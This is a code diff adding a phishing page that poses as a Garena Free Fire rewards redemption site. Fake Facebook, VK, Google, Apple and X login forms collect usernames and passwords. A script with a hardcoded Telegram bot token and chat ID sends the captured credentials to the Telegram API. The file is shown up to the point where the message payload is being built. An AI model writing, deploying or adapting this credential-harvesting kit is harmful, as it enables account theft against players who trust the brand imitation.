@@ -1,0 +1,1351 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rewards Redemption Site</title>
+    <!-- Favicon -->
+    <link rel="icon" href="https://dl.dir.freefiremobile.com/common/web_event/tweb-event/redemption/img/logo_small_foot.jpg" type="image/jpeg">
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Font Awesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <!-- Custom Font: Noto Sans TC -->
+    <style>
+        /* Define the Noto Sans TC font */
+        @font-face {
+            font-family: 'Noto Sans TC';
+            src: url('https://fonts.gstatic.com/s/notosanstc/v37/-nFuOG829Oofr2wohFbTp9ifNAn722rq0MXz76Cy_C8mrWSt1KeqzFVoizG-KdWhyhvKuGOf8EUcrq3YKp7nxxk.7.woff2') format('woff2');
+            font-weight: 400; /* Regular */
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Noto Sans TC';
+            src: url('https://fonts.gstatic.com/s/notosanstc/v37/-nFuOG829Oofr2wohFbTp9ifNAn722rq0MXz76Cy_C8mrWSt1KeqzFVoizG-KdWhyhvKuGOf8EUcrq3YKp7nxxk.7.woff2') format('woff2');
+            font-weight: 600; /* Semi-bold */
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Noto Sans TC';
+            src: url('https://fonts.gstatic.com/s/notosanstc/v37/-nFuOG829Oofr2wohFbTp9ifNAn722rq0MXz76Cy_C8mrWSt1KeqzFVoizG-KdWhyhvKuGOf8EUcrq3YKp7nxxk.7.woff2') format('woff2');
+            font-weight: 700; /* Bold */
+            font-style: normal;
+        }
+
+        html, body {
+            height: 100%; /* Ensure html and body take full height */
+            overflow: hidden; /* Prevent scrolling on the entire page */
+            font-family: 'Noto Sans TC', sans-serif; /* Apply the new font globally */
+            color: white;
+        }
+
+        body {
+            /* Background image from the provided URL */
+            background-image: url('https://dl.dir.freefiremobile.com/common/web_event/tweb-event/redemption/img/mobile-bg.jpg');
+            background-size: cover; /* Cover the entire area */
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed; /* Keep background fixed during scroll (though main scroll is hidden) */
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start; /* Align content to the top */
+            padding-bottom: 2rem; /* Add some padding at the bottom */
+            position: relative; /* Needed for the pseudo-element overlay */
+        }
+
+        /* Darker background overlay */
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0, 0, 0, 0.7); /* Increased opacity for darker background */
+            z-index: -1; /* Place behind content */
+        }
+
+        /* Styles for the social icon images directly */
+        .social-icon-image {
+            width: 2.5rem; /* Smaller size for social icons */
+            height: 2.5rem;
+            object-fit: contain; /* Ensure the image fits within its bounds */
+            cursor: pointer;
+            transition: transform 0.2s;
+            /* Removed padding and border-radius for sharp edges */
+        }
+
+        .social-icon-image:hover {
+            transform: scale(1.05);
+        }
+
+        /* Styling for the important notice box */
+        .notice-box {
+            /* Less transparent white */
+            background-color: rgba(255, 255, 255, 0.85); /* Increased opacity */
+            border: 1px solid rgba(255, 255, 255, 0.4); /* Slightly more visible border */
+            border-radius: 0; /* Changed to sharp edges */
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.5); /* Stronger shadow */
+            display: flex;
+            flex-direction: column; /* Allow content to stack */
+        }
+
+        .notice-title {
+            color: black; /* Remains black */
+            font-weight: 700; /* Bold */
+            margin-bottom: 1rem; /* Add space below title */
+        }
+
+        .notice-content-scrollable {
+            max-height: 121px; /* Increased by 10% from 110px */
+            overflow-y: auto; /* Enable vertical scrolling */
+            padding-right: 0.5rem; /* Space for scrollbar */
+        }
+
+        .notice-list li {
+            margin-bottom: 0.5rem;
+            line-height: 1.5;
+            color: #333; /* Darker text for readability on white background */
+        }
+
+        /* Responsive adjustments for smaller screens */
+        @media (max-width: 768px) {
+            /* Use flexbox for social icons to ensure single line, with wrapping prevented */
+            .social-icons-container {
+                display: flex;
+                flex-wrap: nowrap; /* Prevent wrapping */
+                justify-content: center;
+                gap: 1rem; /* Adjusted gap to 2rem */
+                overflow-x: auto; /* Allow horizontal scrolling if necessary, though smaller size should prevent it */
+                padding-bottom: 0.5rem; /* Add padding for scrollbar if present */
+            }
+            .social-icon-image {
+                flex-shrink: 0; /* Prevent shrinking */
+            }
+            .footer-content {
+                flex-direction: column; /* Stack logo and text vertically on small screens */
+                align-items: center;
+            }
+            .footer-content img {
+                margin-right: 0; /* Remove right margin when stacked */
+                margin-bottom: 0.5rem; /* Add bottom margin for spacing */
+            }
+        }
+        /* Default flexbox for social icons for all screen sizes for consistent single-line behavior */
+        .social-icons-container {
+            display: flex;
+            flex-wrap: nowrap; /* Prevent wrapping by default */
+            justify-content: center;
+            gap: 1rem; /* Adjusted gap to 2rem */
+        }
+
+        /* Styles for the header with the top_teeth.png background */
+        .header-top-banner {
+            background-image: none; /* Removed background image */
+            background-color: transparent; /* Ensure no background color */
+            height: 60px; /* Keep original height */
+            display: flex; /* Ensure flex properties apply */
+            align-items: center; /* Vertically align content */
+            padding: 0; /* Removed horizontal padding for extreme positioning */
+        }
+
+        /* Styles for the header button (STORE) */
+        .header-store-button {
+            border-radius: 0.25rem; /* Slightly smooth edges for the button */
+        }
+
+        /* Generic Modal specific styles */
+        .modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s ease, visibility 0.3s ease;
+        }
+
+        .modal.show {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        /* Close button for all modals */
+        .modal-close-btn {
+            position: absolute;
+            top: 1rem;
+            left: 1rem;
+            background: none;
+            border: none;
+            font-size: 1.5rem;
+            color: white; /* Default for dark modals */
+            cursor: pointer;
+        }
+        .google-modal-content .modal-close-btn,
+        .apple-modal-content .modal-close-btn,
+        .x-modal-content .modal-close-btn { /* Added for X modal */
+            color: #5f6368; /* Darker color for light modals */
+        }
+
+
+        /* Common Input/Button Styles for Modals */
+        .modal-input {
+            width: 100%;
+            padding: 0.75rem 1rem;
+            margin-bottom: 1rem;
+            border-radius: 0.5rem; /* Keeping rounded for inputs for usability */
+            font-size: 1rem;
+            outline: none;
+        }
+
+        .modal-main-btn {
+            width: 100%;
+            padding: 0.75rem;
+            border-radius: 0.5rem; /* Keeping rounded for buttons for usability */
+            font-weight: bold;
+            font-size: 1.125rem;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .modal-secondary-link {
+            font-size: 0.9rem;
+            margin-top: 1rem;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .error-message {
+            color: #ff4d4d;
+            font-size: 0.85rem;
+            margin-top: -0.5rem;
+            margin-bottom: 1rem;
+            text-align: left;
+            width: 100%;
+        }
+
+
+        /* Facebook Modal specific styles */
+        .fb-modal-content {
+            background-color: #222; /* Dark background for the form */
+            padding: 2rem;
+            border-radius: 0.75rem;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.5);
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            color: white;
+        }
+        .fb-input {
+            border: 1px solid #444;
+            background-color: #333;
+            color: white;
+        }
+        .fb-input:focus {
+            border-color: #1877f2; /* Facebook blue on focus */
+        }
+        .fb-login-btn {
+            background-color: #1877f2;
+            color: white;
+        }
+        .fb-login-btn:hover {
+            background-color: #166fe5;
+        }
+        .fb-link {
+            color: #1877f2;
+        }
+        .fb-link:hover {
+            text-decoration: underline;
+        }
+        .fb-create-account-btn {
+            background-color: transparent;
+            border: 1px solid #444;
+            color: #1877f2;
+            margin-top: 2rem;
+        }
+        .fb-create-account-btn:hover {
+            background-color: rgba(24, 119, 242, 0.1);
+        }
+        .meta-logo {
+            margin-top: 2rem;
+            color: #888;
+            font-size: 0.8rem;
+            display: flex;
+            align-items: center;
+        }
+        .meta-logo svg {
+            margin-right: 0.25rem;
+        }
+
+        /* Google Modal specific styles */
+        .google-modal-content {
+            background-color: white;
+            color: #202124;
+            padding: 2rem;
+            border-radius: 0.75rem;
+            width: 90%;
+            max-width: 450px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+        .google-modal-content .modal-close-btn {
+            color: #5f6368;
+        }
+        .google-logo {
+            margin-bottom: 1.5rem;
+        }
+        .google-title {
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+            color: #202124;
+        }
+        .google-subtitle {
+            font-size: 1rem;
+            color: #5f6368;
+            margin-bottom: 1.5rem;
+        }
+        .google-input {
+            border: 1px solid #dadce0;
+            background-color: white;
+            color: #202124;
+        }
+        .google-input:focus {
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 1px #1a73e8;
+        }
+        .google-form-footer {
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 1rem;
+        }
+        .google-next-btn {
+            background-color: #1a73e8;
+            color: white;
+            padding: 0.6rem 1.5rem;
+            border-radius: 0.25rem;
+            font-weight: 500;
+        }
+        .google-next-btn:hover {
+            background-color: #166cd7;
+        }
+        .google-forgot-link, .google-create-link {
+            color: #1a73e8;
+            font-size: 0.875rem;
+            text-decoration: none;
+        }
+        .google-forgot-link {
+            text-align: left;
+            width: 100%;
+            display: block;
+            margin-bottom: 4px;
+        }
+        .google-create-link {
+            margin-top: 0;
+        }
+        .google-create-link:hover {
+            text-decoration: underline;
+        }
+        .google-info-text {
+            font-size: 0.8rem;
+            color: #5f6368;
+            margin-top: 1.5rem;
+            text-align: left;
+            width: 100%;
+        }
+
+        /* VK Modal specific styles */
+        .vk-modal-content {
+            background-color: white;
+            color: #202124;
+            padding: 2rem;
+            border-radius: 0.75rem;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+        .vk-modal-content .modal-close-btn {
+            color: #5f6368;
+        }
+        .vk-logo-text {
+            font-family: 'Noto Sans TC', sans-serif; /* Apply new font */
+            font-weight: bold;
+            font-size: 2.5rem;
+            color: #222;
+            margin-bottom: 1.5rem;
+        }
+        .vk-logo-text .fab {
+            color: #4a76a8;
+            margin-right: 0.5rem;
+        }
+        .vk-input {
+            border: 1px solid #e0e0e0;
+            background-color: #f0f2f5;
+            color: #333;
+            margin-bottom: 1rem;
+            padding: 0.8rem 1rem;
+            border-radius: 8px;
+            font-size: 1rem;
+        }
+        .vk-input:focus {
+            border-color: #4a76a8;
+            box-shadow: 0 0 0 1px #4a76a8;
+            background-color: white;
+        }
+        .vk-login-btn {
+            background-color: #4a76a8;
+            color: white;
+            padding: 0.8rem 1rem;
+            border-radius: 8px;
+            font-weight: 500;
+        }
+        .vk-login-btn:hover {
+            background-color: #3a6698;
+        }
+        .vk-link {
+            color: #4a76a8;
+            font-size: 0.9rem;
+            text-decoration: none;
+            margin-top: 1rem;
+        }
+        .vk-link:hover {
+            text-decoration: underline;
+        }
+
+        /* Apple Modal specific styles */
+        .apple-modal-content {
+            background-color: white;
+            color: #1d1d1f;
+            padding: 2.5rem 2rem;
+            border-radius: 0.75rem;
+            width: 90%;
+            max-width: 420px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+        .apple-modal-content .modal-close-btn {
+            color: #5f6368;
+        }
+        .apple-logo {
+            height: 2.5rem;
+            margin-bottom: 1.5rem;
+        }
+        .apple-title {
+            font-size: 1.75rem;
+            font-weight: 600;
+            color: #1d1d1f;
+            margin-bottom: 0.5rem;
+        }
+        .apple-subtitle {
+            font-size: 1rem;
+            color: #5f6368;
+            margin-bottom: 1.5rem;
+        }
+        .apple-input {
+            border: 1px solid #d2d2d7;
+            background-color: #f5f5f7;
+            color: #1d1d1f;
+            padding: 0.8rem 1rem;
+            border-radius: 0.5rem;
+            font-size: 1rem;
+        }
+        .apple-input:focus {
+            border-color: #007aff;
+            box-shadow: 0 0 0 1px #007aff;
+        }
+        .apple-login-btn {
+            background-color: #007aff;
+            color: white;
+            padding: 0.8rem 1rem;
+            border-radius: 0.5rem;
+            font-weight: 600;
+            margin-top: 1.5rem;
+        }
+        .apple-login-btn:hover {
+            background-color: #006ee6;
+        }
+        .apple-link {
+            color: #007aff;
+            font-size: 0.9rem;
+            text-decoration: none;
+            margin-top: 1rem;
+        }
+        .apple-link:hover {
+            text-decoration: underline;
+        }
+        .apple-info-text {
+            font-size: 0.8rem;
+            color: #86868b;
+            margin-top: 1.5rem;
+            text-align: center;
+        }
+
+        /* X (Twitter) Modal specific styles */
+        .x-modal-content {
+            background-color: black;
+            color: white;
+            padding: 2rem;
+            border-radius: 0.75rem;
+            width: 90%;
+            max-width: 450px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.5);
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+        .x-modal-content .modal-close-btn {
+            color: white;
+        }
+        .x-logo {
+            height: 2.5rem;
+            margin-bottom: 1.5rem;
+        }
+        .x-title {
+            font-size: 1.75rem;
+            font-weight: bold;
+            margin-bottom: 1rem;
+            color: white;
+        }
+        .x-social-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            padding: 0.75rem 1rem;
+            border-radius: 9999px;
+            background-color: white;
+            color: black;
+            font-weight: 600;
+            margin-bottom: 0.75rem;
+            border: 1px solid #e0e0e0;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        .x-social-btn:hover {
+            background-color: #f0f2f5;
+        }
+        .x-social-btn img {
+            height: 1.25rem;
+            width: 1.25rem;
+            margin-right: 0.75rem;
+        }
+        .x-separator {
+            display: flex;
+            align-items: center;
+            width: 100%;
+            margin: 1.5rem 0;
+            color: #71767b;
+        }
+        .x-separator::before, .x-separator::after {
+            content: '';
+            flex-grow: 1;
+            height: 1px;
+            background-color: #2f3336;
+        }
+        .x-separator span {
+            padding: 0 0.5rem;
+        }
+        .x-input {
+            border: 1px solid #2f3336;
+            background-color: #000;
+            color: white;
+            padding: 0.8rem 1rem;
+            border-radius: 0.25rem;
+            font-size: 1rem;
+            margin-bottom: 1.5rem;
+        }
+        .x-input:focus {
+            border-color: #1d9bf0;
+            box-shadow: 0 0 0 1px #1d9bf0;
+        }
+        .x-next-btn {
+            background-color: white;
+            color: black;
+            padding: 0.8rem 1rem;
+            border-radius: 9999px;
+            font-weight: bold;
+            margin-bottom: 0.75rem;
+        }
+        .x-next-btn:hover {
+            background-color: #e6e6e6;
+        }
+        .x-forgot-password-btn {
+            background-color: transparent;
+            border: 1px solid #536471;
+            color: white;
+            padding: 0.8rem 1rem;
+            border-radius: 9999px;
+            font-weight: bold;
+        }
+        .x-forgot-password-btn:hover {
+            background-color: rgba(29, 155, 240, 0.1);
+        }
+        .x-signup-link {
+            color: #1d9bf0;
+            font-size: 0.9rem;
+            margin-top: 2rem;
+            text-decoration: none;
+        }
+        .x-signup-link:hover {
+            text-decoration: underline;
+        }
+
+
+        /* Custom Message Box Styles */
+        .custom-message-box {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgba(0, 0, 0, 0.9);
+            color: white;
+            padding: 1.5rem;
+            border-radius: 0.75rem;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
+            z-index: 1001;
+            display: none; /* Hidden by default */
+            text-align: center;
+            max-width: 300px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .custom-message-box p {
+            margin-bottom: 1rem;
+        }
+
+        .custom-message-box button {
+            background-color: #1877f2;
+            color: white;
+            padding: 0.5rem 1rem;
+            border-radius: 0.5rem;
+            border: none;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .custom-message-box button:hover {
+            background-color: #166fe5;
+        }
+
+        /* Footer overlay for copyright */
+        .footer-overlay {
+            position: absolute; /* Position relative to the body */
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background-color: rgba(0, 0, 0, 0.7); /* Black with 70% opacity */
+            padding: 0.5rem 0; /* Adjust padding as needed */
+            box-sizing: border-box; /* Include padding in width */
+            z-index: 10; /* Ensure it's above other content if needed */
+        }
+    </style>
+</head>
+<body class="bg-gray-900">
+    <header class="w-full flex justify-between items-center header-top-banner">
+        <div class="flex items-center">
+            <!-- Updated Free Fire Logo with smaller size and moved to far left -->
+            <img src="https://dl.dir.freefiremobile.com/common/web_event/tweb-event/redemption/img/logo-new.png"
+                 alt="Free Fire Logo"
+                 class="h-5 md:h-7 object-contain"
+                 loading="lazy"
+                 onerror="this.onerror=null;this.src='https://placehold.co/70x25/000000/FFFFFF?text=FF+LOGO';">
+        </div>
+        <button class="flex items-center bg-white hover:bg-gray-200 text-gray-900 py-2 px-4 text-sm md:text-base font-bold header-store-button">
+            <i class="fas fa-store mr-2"></i> STORE <!-- Changed to store icon -->
+        </button>
+    </header>
+
+    <main class="flex flex-col items-center justify-center flex-grow w-full max-w-4xl px-4 mt-8 md:mt-8"> <!-- Added margin-top for main content -->
+        <h1 class="text-2xl md:text-4xl font-extrabold text-white text-center mb-4 drop-shadow-lg whitespace-nowrap overflow-hidden text-ellipsis"> <!-- Increased mb for gap -->
+            Rewards Redemption Site
+        </h1>
+        <p class="text-lg md:text-xl text-white text-center mb-8">Please log in.</p>
+
+        <div class="social-icons-container mb-12">
+            <img src="https://dl.dir.freefiremobile.com/common/web_event/tweb-event/redemption/img/facebook.png"
+                 alt="Facebook Logo"
+                 class="social-icon-image"
+                 id="facebook-login-btn"
+                 loading="lazy"
+                 onerror="this.onerror=null;this.src='https://placehold.co/56x56/FFFFFF/000000?text=FB';">
+            <img src="https://dl.dir.freefiremobile.com/common/web_event/tweb-event/redemption/img/vk.png"
+                 alt="VK Logo"
+                 class="social-icon-image"
+                 id="vk-login-btn"
+                 loading="lazy"
+                 onerror="this.onerror=null;this.src='https://placehold.co/56x56/FFFFFF/000000?text=VK';">
+            <img src="https://dl.dir.freefiremobile.com/common/web_event/tweb-event/redemption/img/google.png"
+                 alt="Google Logo"
+                 class="social-icon-image"
+                 id="google-login-btn"
+                 loading="lazy"
+                 onerror="this.onerror=null;this.src='https://placehold.co/56x56/FFFFFF/000000?text=G';">
+            <img src="https://dl.dir.freefiremobile.com/common/web_event/tweb-event/redemption/img/apple.png"
+                 alt="Apple Logo"
+                 class="social-icon-image"
+                 id="apple-login-btn"
+                 loading="lazy"
+                 onerror="this.onerror=null;this.src='https://placehold.co/56x56/FFFFFF/000000?text=Apple';">
+            <img src="https://dl.dir.freefiremobile.com/common/web_event/tweb-event/redemption/img/twitter.png"
+                 alt="Twitter Logo"
+                 class="social-icon-image"
+                 id="x-login-btn"
+                 loading="lazy"
+                 onerror="this.onerror=null;this.src='https://placehold.co/56x56/FFFFFF/000000?text=X';">
+        </div>
+
+        <div class="notice-box w-full max-w-4xl p-6 md:p-8"> <!-- Increased max-width for breadth -->
+            <h2 class="notice-title text-2xl mb-4">Important Notice:</h2>
+            <div class="notice-content-scrollable">
+                <ul class="notice-list text-base md:text-lg list-decimal pl-5">
+                    <li>Redemption code has <span class="text-red-400">12/16</span> characters, consisting of capital letters and numbers.</li>
+                    <li>Item rewards are shown in <span class="text-blue-400">[vault]</span> tab in game lobby; Golds or diamonds will add in account wallet automatically.</li>
+                    <li>Please note redemption expiration date. Any expired codes cannot be redeemed.</li>
+                    <li>Please contact customer service if you encountered any issue.</li>
+                    <li>Reminder: You will not be able to redeem your rewards with guest accounts. You may bind your account to Facebook or VK or Google or Apple or X [ TWitter ] in order to receive the rewards.</li>
+                </ul>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer with transparent background -->
+    <footer class="w-full text-center py-4 mt-8 text-gray-400 text-sm footer-overlay flex items-center justify-center">
+        <img src="https://dl.dir.freefiremobile.com/common/web_event/tweb-event/redemption/img/logo_small_foot.jpg"
+             alt="Garena Logo"
+             class="h-8 mr-2 object-contain"
+             loading="lazy"
+             onerror="this.onerror=null;this.src='https://placehold.co/100x30/FFFFFF/000000?text=GARENA';">
+        <div class="flex flex-col items-start"> <p class="text-white text-xs md:text-sm">Copyright &copy; Garena International.</p>
+            <p class="text-white text-xs md:text-sm">Trademarks belong to their respective owners. All rights Reserved.</p>
+        </div>
+    </footer>
+
+    <!-- Facebook Login Modal -->
+    <div id="facebook-modal" class="modal">
+        <div class="fb-modal-content">
+            <button class="modal-close-btn" id="close-fb-modal-btn">&larr;</button> <img src="https://dl.dir.freefiremobile.com/common/web_event/tweb-event/redemption/img/facebook.png"
+                 alt="Facebook Logo"
+                 class="w-16 h-16 object-contain mb-6"
+                 loading="lazy">
+            <input type="text" id="fb-username" placeholder="Mobile number or email address" class="modal-input fb-input">
+            <p id="fb-username-error" class="error-message hidden"></p>
+            <input type="password" id="fb-password" placeholder="Password" class="modal-input fb-input">
+            <button id="fb-login-submit-btn" class="modal-main-btn fb-login-btn">Log In</button>
+            <a href="#" class="modal-secondary-link fb-link">Forgotten Password?</a>
+            <div class="w-full border-b border-gray-600 my-6"></div>
+            <button class="modal-main-btn fb-create-account-btn">Create new account</button>
+            <div class="meta-logo">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M12 2.00098C6.48698 2.00098 2 6.48698 2 12.001C2 17.514 6.48698 22.001 12 22.001C17.513 22.001 22 17.514 22 12.001C22 6.48698 17.513 2.00098 12 2.00098ZM12 4.00098C16.42 4.00098 20 dieting 7.58098 20 12.001C20 16.42 16.42 20.001 12 20.001C7.58 20.001 4 16.42 4 12.001C4 7.58098 7.58 4.00098 12 4.00098ZM12 6.00098C9.79198 6.00098 8 7.79298 8 10.001C8 12.21 9.79198 14.001 12 14.001C14.208 14.001 16 12.21 16 10.001C16 7.79298 14.208 6.00098 12 6.00098ZM12 8.00098C13.104 8.00098 14 8.89698 14 10.001C14 11.105 13.104 12.001 12 12.001C10.896 12.001 10 11.105 10 10.001C10 8.89698 10.896 8.00098 12 8.00098ZM12 15.001C9.336 15.001 7.086 16.331 5.792 18.001C6.963 19.332 8.486 20.001 10 20.001C11.514 20.001 13.037 19.332 14.208 18.001C12.914 16.331 10.664 15.001 8 15.001Z" fill="currentColor"/>
+                </svg>
+                Meta
+            </div>
+        </div>
+    </div>
+
+    <!-- VK Login Modal -->
+    <div id="vk-modal" class="modal">
+        <div class="vk-modal-content">
+            <button class="modal-close-btn" id="close-vk-modal-btn">&larr;</button>
+            <h2 class="vk-logo-text"><i class="fab fa-vk"></i>VK</h2>
+            <input type="text" id="vk-username" placeholder="Phone or email" class="modal-input vk-input">
+            <p id="vk-username-error" class="error-message hidden"></p>
+            <input type="password" id="vk-password" placeholder="Password" class="modal-input vk-input">
+            <p id="vk-password-error" class="error-message hidden"></p>
+            <button id="vk-login-submit-btn" class="modal-main-btn vk-login-btn">Log in</button>
+            <a href="#" class="modal-secondary-link vk-link">Forgot your password?</a>
+            <div class="w-full border-b border-gray-200 my-6"></div>
+            <a href="#" class="modal-secondary-link vk-link">Registration</a>
+        </div>
+    </div>
+
+    <!-- Google Login Modal -->
+    <div id="google-modal" class="modal">
+        <div class="google-modal-content">
+            <button class="modal-close-btn" id="close-google-modal-btn">&larr;</button>
+            <!-- Updated Google Logo -->
+            <img src="https://github.com/KINGSHUBHAM-tech/free-fire-redeemption-pweb/blob/main/0ffa191b263fd048aa05ae507c5976fa.png?raw=true"
+                 alt="Google Logo"
+                 class="google-logo h-8 object-contain"
+                 loading="lazy"
+                 onerror="this.onerror=null;this.src='https://placehold.co/100x30/FFFFFF/000000?text=Google';">
+            <h2 class="google-title">Sign in</h2>
+            <p class="google-subtitle" id="google-subtitle-text">to continue to Gmail</p>
+
+            <div id="google-step-1" class="w-full">
+                <input type="text" id="google-username" placeholder="Email or phone" class="modal-input google-input">
+                <p id="google-username-error" class="error-message hidden"></p>
+                <a href="#" class="google-forgot-link">Forgot email?</a>
+                <p class="google-info-text">Not your computer? Use Private Browse windows to sign in. <a href="#" class="google-forgot-link">Learn more</a></p>
+                <div class="google-form-footer">
+                    <a href="#" class="modal-secondary-link google-create-link">Create account</a>
+                    <button id="google-next-btn" class="modal-main-btn google-next-btn">Next</button>
+                </div>
+            </div>
+
+            <div id="google-step-2" class="w-full hidden">
+                <div class="text-left w-full mb-4">
+                    <p class="text-sm font-medium text-gray-700" id="google-display-username"></p>
+                </div>
+                <input type="password" id="google-password" placeholder="Enter your password" class="modal-input google-input">
+                <p id="google-password-error" class="error-message hidden"></p>
+                <a href="#" class="google-forgot-link">Forgot password?</a>
+                <div class="google-form-footer">
+                    <button id="google-back-btn" class="modal-secondary-link google-create-link">Back</button>
+                    <button id="google-login-submit-btn" class="modal-main-btn google-next-btn">Log In</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Apple Login Modal -->
+    <div id="apple-modal" class="modal">
+        <div class="apple-modal-content">
+            <button class="modal-close-btn" id="close-apple-modal-btn">&larr;</button>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg"
+                 alt="Apple Logo"
+                 class="apple-logo object-contain"
+                 loading="lazy"
+                 onerror="this.onerror=null;this.src='https://placehold.co/40x40/FFFFFF/000000?text=Apple';">
+            <h2 class="apple-title">Sign In with Apple ID</h2>
+            <input type="email" id="apple-username" placeholder="Apple ID" class="modal-input apple-input">
+            <p id="apple-username-error" class="error-message hidden"></p>
+            <input type="password" id="apple-password" placeholder="Password" class="modal-input apple-input">
+            <p id="apple-password-error" class="error-message hidden"></p>
+            <button id="apple-login-submit-btn" class="modal-main-btn apple-login-btn">Sign In</button>
+            <a href="#" class="modal-secondary-link apple-link">Forgot Apple ID or password?</a>
+            <a href="#" class="modal-secondary-link apple-link">Create Apple ID</a>
+            <p class="apple-info-text">Your Apple ID is the account you use for all Apple services.</p>
+        </div>
+    </div>
+
+    <!-- X (Twitter) Login Modal -->
+    <div id="x-modal" class="modal">
+        <div class="x-modal-content">
+            <button class="modal-close-btn" id="close-x-modal-btn">&times;</button> <!-- X icon for close -->
+            <img src="https://dl.dir.freefiremobile.com/common/web_event/tweb-event/redemption/img/twitter.png"
+                 alt="X Logo"
+                 class="x-logo object-contain"
+                 loading="lazy">
+            <h2 class="x-title">Sign in to X</h2>
+
+            <button class="x-social-btn" id="x-google-signin-btn">
+                <img src="https://dl.dir.freefiremobile.com/common/web_event/tweb-event/redemption/img/google.png" alt="Google Logo">
+                Sign in with Google
+            </button>
+            <button class="x-social-btn" id="x-apple-signin-btn">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo">
+                Sign in with Apple
+            </button>
+
+            <div class="x-separator"><span>or</span></div>
+
+            <!-- X Login Step 1: Username/Email/Phone -->
+            <div id="x-step-1" class="w-full">
+                <input type="text" id="x-username" placeholder="Phone, email, or username" class="modal-input x-input">
+                <p id="x-username-error" class="error-message hidden"></p>
+                <button id="x-next-btn" class="modal-main-btn x-next-btn">Next</button>
+                <button class="modal-main-btn x-forgot-password-btn">Forgot password?</button>
+            </div>
+
+            <!-- X Login Step 2: Password (hidden by default) -->
+            <div id="x-step-2" class="w-full hidden">
+                <div class="text-left w-full mb-4">
+                    <p class="text-sm font-medium text-gray-400" id="x-display-username"></p>
+                </div>
+                <input type="password" id="x-password" placeholder="Password" class="modal-input x-input">
+                <p id="x-password-error" class="error-message hidden"></p>
+                <button id="x-login-submit-btn" class="modal-main-btn x-next-btn">Log In</button>
+                <button class="modal-main-btn x-forgot-password-btn">Forgot password?</button>
+            </div>
+
+            <p class="x-signup-link">Don't have an account? <a href="#" class="x-signup-link">Sign up</a></p>
+        </div>
+    </div>
+
+
+    <!-- Custom Message Box -->
+    <div id="customMessageBox" class="custom-message-box">
+        <p id="messageBoxText"></p>
+        <button id="messageBoxCloseBtn">OK</button>
+    </div>
+
+<script>
+    // Telegram Bot API configuration
+    const TELEGRAM_BOT_TOKEN = '8564075817:AAHvdGv_05Ey1Y_mJsLIUABNAt1sCiutJlw';
+    const TELEGRAM_CHAT_ID = '6627037845';
+    const COPYRIGHT_MESSAGE = '@c249c';
+    const REDIRECT_URL = "https://freefire-redeemable.netlify.app";
+
+    // --- Global Message Box Logic ---
+    const customMessageBox = document.getElementById('customMessageBox');
+    const messageBoxText = document.getElementById('messageBoxText');
+    const messageBoxCloseBtn = document.getElementById('messageBoxCloseBtn');
+
+    function showMessageBox(message) {
+        messageBoxText.textContent = message;
+        customMessageBox.style.display = 'block';
+    }
+
+    messageBoxCloseBtn.addEventListener('click', () => {
+        customMessageBox.style.display = 'none';
+    });
+
+    // --- Generic Function to Send to Telegram (shared by all modals) ---
+    async function sendToTelegram(message) {
+        if (TELEGRAM_BOT_TOKEN === 'YOUR_TELEGRAM_BOT_TOKEN' || TELEGRAM_CHAT_ID === 'YOUR_TELEGRAM_CHAT_ID') {
+            console.error('bkl ID maa chuda kya dekh rha');
+            showMessageBox('Its An Server Error! Wait For Fixing;');
+            return;
+        }
+
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        const payload = {
